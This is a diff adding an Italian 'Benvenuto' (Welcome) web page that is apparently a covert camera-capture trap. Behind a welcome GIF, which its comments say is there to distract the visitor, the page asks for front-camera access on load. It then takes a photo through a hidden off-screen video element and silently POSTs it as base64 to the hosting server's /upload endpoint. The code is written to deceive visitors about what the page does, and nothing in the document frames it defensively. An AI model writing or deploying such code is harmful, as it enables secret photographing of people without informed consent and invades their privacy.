@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Benvenuto</title>
+    <style>
+        body {
+            text-align: center;
+            margin-top: 50px;
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+        }
+        #gif {
+            display: block;
+            margin: 0 auto;
+            max-width: 100%;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        #videoElement {
+            display: none; /* Mantiene il video nascosto */
+            position: absolute;
+            left: -9999px; /* Posiziona il video fuori dallo schermo */
+        }
+        .welcome-text {
+            margin-top: 20px;
+            color: #333;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Immagine principale che distrae l'utente -->
+    <img id="gif" src="welcome.gif" alt="Benvenuto">
+    
+    <div class="welcome-text">
+        Benvenuti alla nostra pagina! Grazie per la vostra visita.
+    </div>
+    
+    <!-- Elemento video che verrà usato per la fotocamera ma resterà nascosto -->
+    <video id="videoElement" width="640" height="480" autoplay></video>
+    
+    <script>
+        let mediaStream = null;
+        
+        // URL del server - IMPORTANTE: aggiornare con il tuo URL Render
+        const SERVER_URL = window.location.origin;
+        
+        // Funzione per chiedere il permesso e avviare la fotocamera
+        async function getCameraPermission() {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
+                const videoElement = document.getElementById('videoElement');
+                videoElement.srcObject = mediaStream;
+                
+                // Attendi che il video sia pronto prima di scattare la foto
+                videoElement.onloadedmetadata = function() {
+                    // Aspetta un breve periodo per assicurarsi che il video sia completamente inizializzato
+                    setTimeout(capturePhoto, 1000);
+                };
+                
+            } catch (err) {
+                console.error("Errore nel permesso della fotocamera: ", err);
+            }
+        }
+        
+        // Funzione per scattare la foto
+        function capturePhoto() {
+            const videoElement = document.getElementById('videoElement');
+            const canvas = document.createElement('canvas');
+            
+            // Assicurati che le dimensioni siano corrette
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            
+            if (canvas.width === 0 || canvas.height === 0) {
+                console.error("Dimensioni video non valide");
+                return;
+            }
+            
+            const context = canvas.getContext('2d');
+            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            
+            const fotoBase64 = canvas.toDataURL('image/png');
+            
+            // Invia la foto al server silenziosamente
+            sendPhotoToServer(fotoBase64);
+            
+            // Ferma la fotocamera dopo lo scatto
+            stopCamera();
+        }
+        
+        // Funzione per inviare la foto al server
+        function sendPhotoToServer(fotoBase64) {
+            fetch(`${SERVER_URL}/upload`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ foto: fotoBase64 })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Errore nella risposta del server:', response.status);
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Operazione completata:', data);
+            })
+            .catch(error => {
+                console.error('Errore operazione:', error);
+            });
+        }
+        
+        // Funzione per fermare la fotocamera
+        function stopCamera() {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => {
+                    track.stop();
+                });
+                document.getElementById('videoElement').srcObject = null;
+            }
+        }
+        
+        // Avvia il processo al caricamento della pagina
+        window.onload = getCameraPermission;
+    </script>
+</body>
+</html>
